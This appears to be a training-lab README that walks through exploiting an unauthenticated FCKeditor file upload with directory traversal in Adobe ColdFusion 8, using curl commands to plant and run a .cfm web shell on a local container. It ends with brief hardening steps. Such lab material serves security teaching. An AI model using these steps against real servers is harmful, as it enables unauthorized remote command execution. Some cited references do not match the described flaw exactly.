# Adobe ColdFusion 8 Arbitrary File Upload & Traversal RCE

## Overview

Adobe ColdFusion is a commercial rapid web application development platform. In ColdFusion 8, the FCKeditor component embedded in /CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm allowed unauthenticated users to upload files with arbitrary extensions. By leveraging directory traversal in the CurrentFolder parameter, attackers can write ColdFusion Markup (.cfm) web shells into the webroot.

- **Service Access**: `http://localhost:8167/`
- **Default Credentials**: `Unauthenticated file upload`
- **Docker Shortcut**: `./lab start coldfusion-rce`
- **Container Name**: `cyberlab_04_coldfusion_rce`
- **RAM Footprint**: ~500M

---

## Exploitation Walkthrough

### 1. Verify FCKeditor Connector Status

```bash
curl -i http://localhost:8167/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm
```

### 2. Upload Malicious CFM Web Shell via Multipart POST

```bash
curl -i -X POST 'http://localhost:8167/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=/../../' \
  -F 'NewFile=@shell.cfm;filename=pwn.cfm'
```

### 3. Execute Commands via Uploaded Shell

```bash
curl 'http://localhost:8167/pwn.cfm?cmd=id'
```

---

## Defensive Remediation & Hardening

1. Upgrade ColdFusion to supported versions and apply vendor hotfixes.
2. Remove or restrict access to /CFIDE/scripts/ajax/FCKeditor/.
3. Disable executable file extensions in connector configuration.

---

## Video Walkthroughs & Technical References

- [5 - File Upload (low/med/high) - Damn Vulnerable Web Application (DVWA)](https://www.youtube.com/watch?v=K7XBQWAZdZ4)
- [Adobe ColdFusion Security Bulletin](https://helpx.adobe.com/security.html)
- [Vulhub ColdFusion Environment](https://vulhub.org/#/environments/coldfusion/CVE-2010-2861/)
